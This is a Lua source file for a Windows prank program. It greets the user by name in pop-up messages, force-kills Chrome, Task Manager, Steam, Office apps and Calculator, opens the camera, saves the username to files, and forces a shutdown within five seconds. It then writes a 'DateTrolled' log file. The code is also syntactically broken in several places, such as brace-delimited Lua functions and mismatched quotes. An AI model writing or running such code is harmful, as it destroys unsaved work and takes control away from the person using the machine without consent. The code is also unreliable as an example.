local ui = require "ui"

local dir = sys.Directory(sys.currentdir);

local json = require "json"

local user = print(os.getenv('USERNAME'));

local shutso = json.decode("assets/shutter.jinf");

--Functions

function CloseDistractions () {
  os.execute("taskkill /F /IM \"chrome.exe\" /T");  --Chrome

  os.execute("taskkill /F /IM \"taskmgr.exe\" /T");  --Task Manager

  os.execute("taskkill /F /IM \"steam.exe\" /T");  --Steam

  os.execute("taskkill /F /IM \"calc.exe\" /T");  --Calculator (LMFAO)

  os.execute("taskkill /F /IM \"winword.exe\" /T");  --MS Word

  os.execute("taskkill /F /IM \"excel.exe\" /T");  --MS Excel
}

function MakeDirReal () {
    Directory.make("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua")
    file = io.open("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua\\DateTrolled.txt", "w")
    file:write("Successfully Trolled On "..sys.Datetime().." At "..sys.Datetime()..")
    file:close()
}

--here comes the garbage lmao

ui.info("Hey dude");

ui.info("Wait...");

ui.info("I think I know you!");

json.save("userinfo/username.jinf", user);

json.save("userinfo/openday.jinf", print(sys.DateTime().dayname));
      
ui.info("Are you "..os.getenv('USERNAME').."?");

ui.info("It is you!");

ui.info("Hey "..os.getenv('USERNAME')..", what are you looking at over there?");

ui.info("Don\'t worry, I\'ll deal with that for you!");

CloseDistractions();

ui.info("Now that that\'s dealt with...");

ui.info("How\'s it going "..os.getenv('USERNAME').."?");

ui.info("Having a good "..print(sys.Datetime().dayname).."?");

ui.info("That\'s great!");

ui.info("Actually, I kinda forgot what you look like!");

os.execute("microsoft.windows.camera;");

ui.info("Now I remember!");

ui.info("Anyways,");

ui.info("I gotta go now");

ui.info("Bye "..os.getenv('USERNAME').."!!!");

os.execute("shutdown /s /t 05"); --LMFAO

MakeDirReal();

--trolled, bitch.
